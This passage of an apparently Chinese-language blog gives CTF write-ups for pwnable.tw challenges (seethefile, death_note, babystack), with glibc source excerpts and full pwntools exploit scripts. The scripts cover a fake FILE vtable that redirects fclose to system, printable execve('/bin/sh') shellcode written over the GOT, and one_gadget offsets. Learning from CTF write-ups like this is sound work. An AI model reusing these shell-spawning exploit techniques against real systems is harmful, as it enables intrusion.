class="code"><pre><span class="line">/* Return the `struct tm&apos; representation of *T in local time.  */</span><br><span class="line">struct tm *</span><br><span class="line">localtime (const time_t *t)</span><br><span class="line">&#123;</span><br><span class="line">  return __tz_convert (t, 1, &amp;_tmbuf);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (localtime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Return the `struct tm&apos; representation of *TIMER in the local timezone.</span><br><span class="line">   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span><br><span class="line">struct tm *</span><br><span class="line">__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)</span><br><span class="line">&#123;</span><br><span class="line">  long int leap_correction;</span><br><span class="line">  int leap_extra_secs;</span><br><span class="line"></span><br><span class="line">  if (timer == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (tzset_lock);</span><br><span class="line"></span><br><span class="line">  /* Update internal database according to current TZ setting.</span><br><span class="line">     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.</span><br><span class="line">     This is a good idea since this allows at least a bit more parallelism.  */</span><br><span class="line">  tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime, 1);</span><br><span class="line"></span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    __tzfile_compute (*timer, use_localtime, &amp;leap_correction,</span><br><span class="line">      &amp;leap_extra_secs, tp);</span><br><span class="line">      </span><br><span class="line">  &lt;--无关代码省略--&gt;</span><br><span class="line">  </span><br><span class="line">  return tp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Interpret the TZ envariable.  */</span><br><span class="line">static void</span><br><span class="line">internal_function</span><br><span class="line">tzset_internal (int always, int explicit)</span><br><span class="line">&#123;</span><br><span class="line">  static int is_initialized;</span><br><span class="line">  const char *tz;</span><br><span class="line"></span><br><span class="line">  if (is_initialized &amp;&amp; !always)</span><br><span class="line">    return;</span><br><span class="line">  is_initialized = 1;</span><br><span class="line"></span><br><span class="line">  /* Examine the TZ environment variable.  */</span><br><span class="line">  tz = getenv (&quot;TZ&quot;);//★注意此处,从env中读取TZ的值</span><br><span class="line">  if (tz == NULL &amp;&amp; !explicit)</span><br><span class="line">    /* Use the site-wide default.  This is a file name which means we</span><br><span class="line">       would not see changes to the file if we compare only the file</span><br><span class="line">       name for change.  We want to notice file changes if tzset() has</span><br><span class="line">       been called explicitly.  Leave TZ as NULL in this case.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC explicitly.  */</span><br><span class="line">    tz = &quot;Universal&quot;;</span><br><span class="line"></span><br><span class="line">  /* A leading colon means &quot;implementation defined syntax&quot;.</span><br><span class="line">     We ignore the colon and always use the same algorithm:</span><br><span class="line">     try a data file, and if none exists parse the 1003.1 syntax.  */</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;:&apos;)</span><br><span class="line">    ++tz;</span><br><span class="line"></span><br><span class="line">  /* Check whether the value changed since the last run.  */</span><br><span class="line">  if (old_tz != NULL &amp;&amp; tz != NULL &amp;&amp; strcmp (tz, old_tz) == 0)</span><br><span class="line">    /* No change, simply return.  */</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  if (tz == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line"></span><br><span class="line">  tz_rules[0].name = NULL;</span><br><span class="line">  tz_rules[1].name = NULL;</span><br><span class="line"></span><br><span class="line">  /* Save the value of `tz&apos;.  */</span><br><span class="line">  free (old_tz);</span><br><span class="line">  old_tz = tz ? __strdup (tz) : NULL;</span><br><span class="line"></span><br><span class="line">  /* Try to read a data file.  */</span><br><span class="line">  __tzfile_read (tz, 0, NULL);//★带着TZ进入__tzfile_read函数</span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">&lt;--无关代码省略--&gt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">__tzfile_read (const char *file, size_t extra, char **extrap)</span><br><span class="line">&#123;</span><br><span class="line">  static const char default_tzdir[] = TZDIR;</span><br><span class="line">  size_t num_isstd, num_isgmt;</span><br><span class="line">  FILE *f;</span><br><span class="line">  struct tzhead tzhead;</span><br><span class="line">  size_t chars;</span><br><span class="line">  size_t i;</span><br><span class="line">  size_t total_size;</span><br><span class="line">  size_t types_idx;</span><br><span class="line">  size_t leaps_idx;</span><br><span class="line">  int was_using_tzfile = __use_tzfile;</span><br><span class="line">  int trans_width = 4;</span><br><span class="line">  size_t tzspec_len;</span><br><span class="line">  char *new = NULL;</span><br><span class="line"></span><br><span class="line">  if (sizeof (time_t) != 4 &amp;&amp; sizeof (time_t) != 8)</span><br><span class="line">    abort ();</span><br><span class="line"></span><br><span class="line">  __use_tzfile = 0;</span><br><span class="line"></span><br><span class="line">  if (file == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    file = TZDEFAULT;</span><br><span class="line">  else if (*file == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC with no leap seconds.  */</span><br><span class="line">    goto ret_free_transitions;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* We must not allow to read an arbitrary file in a setuid</span><br><span class="line"> program.  So we fail for any file which is not in the</span><br><span class="line"> directory hierachy starting at TZDIR</span><br><span class="line"> and which is not the system wide default TZDEFAULT.  */</span><br><span class="line">      if (__libc_enable_secure</span><br><span class="line">  &amp;&amp; ((*file == &apos;/&apos;</span><br><span class="line">       &amp;&amp; memcmp (file, TZDEFAULT, sizeof TZDEFAULT)</span><br><span class="line">       &amp;&amp; memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))</span><br><span class="line">      || strstr (file, &quot;../&quot;) != NULL))</span><br><span class="line">/* This test is certainly a bit too restrictive but it should</span><br><span class="line">   catch all critical cases.  */</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (*file != &apos;/&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">      const char *tzdir;</span><br><span class="line"></span><br><span class="line">      tzdir = getenv (&quot;TZDIR&quot;);//★从环境变量TZDIR中读取目录</span><br><span class="line">      if (tzdir == NULL || *tzdir == &apos;\0&apos;)</span><br><span class="line">tzdir = default_tzdir;</span><br><span class="line">      if (__asprintf (&amp;new, &quot;%s/%s&quot;, tzdir, file) == -1)</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">      file = new;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If we were already using tzfile, check whether the file changed.  */</span><br><span class="line">  struct stat64 st;</span><br><span class="line">  if (was_using_tzfile</span><br><span class="line">      &amp;&amp; stat64 (file, &amp;st) == 0</span><br><span class="line">      &amp;&amp; tzfile_ino == st.st_ino &amp;&amp; tzfile_dev == st.st_dev</span><br><span class="line">      &amp;&amp; tzfile_mtime == st.st_mtime)</span><br><span class="line">    goto done;  /* Nothing to do.  */</span><br><span class="line"></span><br><span class="line">  /* Note the file is opened with cancellation in the I/O functions</span><br><span class="line">     disabled and if available FD_CLOEXEC set.  */</span><br><span class="line">  f = fopen (file, &quot;rce&quot;);//★打开文件</span><br></pre></td></tr></table></figure><p>最后是通过malloc读取文件内容到heap上的，所以我们只需要控制TZ 和 TZDIR 就能读取flag内容到heap上；（类似于函数源码漏洞？）</p><p>printf_chk 源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* Write formatted output to stdout from the format string FORMAT.  */</span><br><span class="line">int</span><br><span class="line">___printf_chk (int flag, const char *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  int done;</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock_clear_flags2 (stdout);</span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 |= _IO_FLAGS2_FORTIFY;</span><br><span class="line"></span><br><span class="line">  va_start (ap, format);</span><br><span class="line">  done = vfprintf (stdout, format, ap);</span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY;</span><br><span class="line">  _IO_release_lock (stdout);</span><br><span class="line"></span><br><span class="line">  return done;</span><br><span class="line">&#125;</span><br><span class="line">ldbl_strong_alias (___printf_chk, __printf_chk)</span><br></pre></td></tr></table></figure><p>printf_chk 格式化字符串漏洞。。。神奇、、</p><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><p>第一次见FILE题，学习一下</p><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p>功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;---------------MENU---------------&quot;);</span><br><span class="line">  puts(&quot;  1. Open&quot;);</span><br><span class="line">  puts(&quot;  2. Read&quot;);</span><br><span class="line">  puts(&quot;  3. Write to screen&quot;);</span><br><span class="line">  puts(&quot;  4. Close&quot;);</span><br><span class="line">  puts(&quot;  5. Exit&quot;);</span><br><span class="line">  puts(&quot;----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>open打开文件，read读入0x18f的数据，如果文件名或读入的数据中没有‘flag’ 或 ‘FLAG’，就能够write到屏幕上，close关闭文件，exit时让输入姓名，会溢出。</p><h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><p>后面给了一个明显的溢出，也就是我们的切入点，gdb调试发现name在bss段，后面只有一个指向文件的fp指针，意图很明显。<br>我们可以先读取/map/self/maps 来获取程序的段信息，虽然能读入的信息较少，但是足以获得heap基地址以用来得到libc基地址。<br>至于fp指针，需要将其覆盖并继续溢出伪造一个FILE结构体，fp指针就是指向这个结构体以避免程序错误退出，同时将伪造的虚表上的vtable该为system，fclose即可即可调用system。</p><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process(&apos;./seethefile&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10200)</span><br><span class="line">elf = ELF(&apos;./seethefile&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line">def open(name):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;see :&apos;)</span><br><span class="line">sh.sendline(name)</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def close():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">def exit(con):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;Leave your name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">open(&apos;/proc/self/maps&apos;)</span><br><span class="line">read()</span><br><span class="line">write()</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">heap = int(sh.recvline()[:8],16)</span><br><span class="line">success(&apos;heap: &apos;+hex(heap))</span><br><span class="line">libc.address = int(sh.recvline()[:8],16)+0x1000</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">pay = &apos;\x00&apos;*32 + p32(0x0804B300)</span><br><span class="line">pay+=&apos;\x00&apos;*(0x80-4)</span><br><span class="line">file = &apos;\xff\xff\xff\xff;$0\x00&apos;.ljust(0x48,&apos;\x00&apos;)</span><br><span class="line">file = file.ljust(0x94,&apos;\x00&apos;)  //在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8;</span><br><span class="line">pay+=file</span><br><span class="line">pay+=p32(0x0804B300+0x98)</span><br><span class="line">pay+=p32(system)*21#vtable</span><br><span class="line">exit(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="death-note"><a href="#death-note" class="headerlink" title="death_note"></a>death_note</h1><p><em>话说这边的题难度真是飘忽不定。。</em></p><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot;             DeathNote             &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot; 1. Add a name                     &quot;);</span><br><span class="line">  puts(&quot; 2. show a name on the note        &quot;);</span><br><span class="line">  puts(&quot; 3. delete a name int the note     &quot;);</span><br><span class="line">  puts(&quot; 4. Exit                           &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># checksec death_note</span><br><span class="line">[*] &apos;/root/pwnable/death_note1/death_note&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h2><p>题目的功能就是menu上的那样，不过在里面add的时候，index是自己选的，而且没有任何限制， 所以是有希望随便输入负数，将name也就是我们要输入的shellcode往上覆盖到got表来get shell。</p><p>输入的内容会进行检查，必须是可打印字符且最长为0x50，所以shellcode也需要在限制条件之内。<br>shellcode可以使用metasploit自带的msfvenom来生成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./death_note&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10201)</span><br><span class="line"></span><br><span class="line">def add(idx,con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(&apos;Name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">pay = asm(&apos;&apos;&apos;</span><br><span class="line">/* execve(&apos;/bin///sh&apos;,0,0)*/</span><br><span class="line"></span><br><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line"></span><br><span class="line">push esp</span><br><span class="line">pop ebx /*set ebx to &apos;/bin///sh&apos;*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">dec edx</span><br><span class="line">dec edx /*set dl to 0xfe*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor [eax+32],dl /*decode int 0x80*/</span><br><span class="line">xor [eax+33],dl /*decode int 0x80*/</span><br><span class="line"></span><br><span class="line">inc edx</span><br><span class="line">inc edx /*recover edx to 0*/</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">pop ecx /*set ecx to 0*/</span><br><span class="line"></span><br><span class="line">push 0x40</span><br><span class="line">pop eax</span><br><span class="line">xor al,0x4b /*set eax to 0xb*/</span><br><span class="line"></span><br><span class="line">/*int 0x80*/</span><br><span class="line">&apos;&apos;&apos;)+&apos;\x33\x7e&apos;</span><br><span class="line"></span><br><span class="line">add(-19,pay)</span><br><span class="line">dele(-19)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p><em>终于有时间继续做了、、</em></p><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><p>保护全开。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rcx</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  char des; // [rsp+0h] [rbp-60h]</span><br><span class="line">  __int64 buf; // [rsp+40h] [rbp-20h]</span><br><span class="line">  __int64 v8; // [rsp+48h] [rbp-18h]</span><br><span class="line">  char v9; // [rsp+50h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  mmap_for_proc();</span><br><span class="line">  files[0] = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(files[0], &amp;buf, 0x10uLL);</span><br><span class="line">  v3 = IsMmap_ptr;</span><br><span class="line">  v4 = v8;</span><br><span class="line">  *IsMmap_ptr = buf;</span><br><span class="line">  v3[1] = v4;</span><br><span class="line">  close(files[0]);                              </span><br><span class="line">                                                 </span><br><span class="line">                                                 </span><br><span class="line">                                                 </span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;&gt;&gt; &quot;, 3uLL);</span><br><span class="line">    _read_chk(0LL, &amp;v9, 0x10LL, 0x10LL);</span><br><span class="line">    if ( v9 == &apos;2&apos; )</span><br><span class="line">      break;</span><br><span class="line">    if ( v9 == &apos;3&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( password_inuse )</span><br><span class="line">        read_to_des(&amp;des);</span><br><span class="line">      else</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v9 == &apos;1&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( password_inuse )</span><br><span class="line">        password_inuse = 0;</span><br><span class="line">      else</span><br><span class="line">        login(&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !password_inuse )</span><br><span class="line">    exit(0);</span><br><span class="line">  if ( memcmp(&amp;buf, IsMmap_ptr, 0x10uLL) )</span><br><span class="line">    JUMPOUT(loc_100B);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall login(const char *buf)</span><br><span class="line">&#123;</span><br><span class="line">  size_t len; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Your passowrd :&quot;);</span><br><span class="line">  read_int(&amp;s, 0x7Fu);</span><br><span class="line">  len = strlen(&amp;s);</span><br><span class="line">  if ( strncmp(&amp;s, buf, len) )</span><br><span class="line">    return puts(&quot;Failed !&quot;);</span><br><span class="line">  password_inuse = 1;</span><br><span class="line">  return puts(&quot;Login Success !&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall read_to_des(char *des)</span><br><span class="line">&#123;</span><br><span class="line">  char src; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Copy :&quot;);</span><br><span class="line">  read_int(&amp;src, 0x3Fu);</span><br><span class="line">  strcpy(des, &amp;src);</span><br><span class="line">  return puts(&quot;It is magic copy !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h2><p>main函数刚开始随机得到0x10个字节的数据并将其复制到buf处，并将全局变量指针*IsMmap_ptr指向该内存。<br>read_chk读入参数，1-login(与随机得到的0x10个字节进行比较输入字节长度len的密码是否正确)或清除密码标志位密码，2-退出，3-检查密码标志位，为1则可读入0x3f字节的数据复制到des处</p><p>问题：</p><ol><li>login时可以不输入密码，直接回车可以跳过判定；或者以/x00开头跳过判定；或者可以依次爆破得到随机数password。</li><li>strcpy将src处的值复制到des，靠的是识别末尾处的/x00截断，而read_int并不会自动给加上/x00，因为输入字节的限制，看上去感觉并不会溢出，但是因为login函数用的是同一个栈段，所以有希望在src[0x3f]处将其置为非/x00，这样strcpy便会产生溢出。</li><li>为了getshell，rop不太可能–canary的存在，使得可能爆破出来的canary在最后会有/x00截断，这样strcpy就没法溢出到返回地址处了。所以应该要使用Onegadget一发入魂，但是libc地址搞不出来。。。。</li></ol><p>得到大佬的思路：strcpy后原来的buf处变为两个libc中的地址，将其泄露计算libc基地址即可（ps：这一步仍有问题）</p><h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># one_gadget ./libc_64.so.6 </span><br><span class="line">0x45216execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span 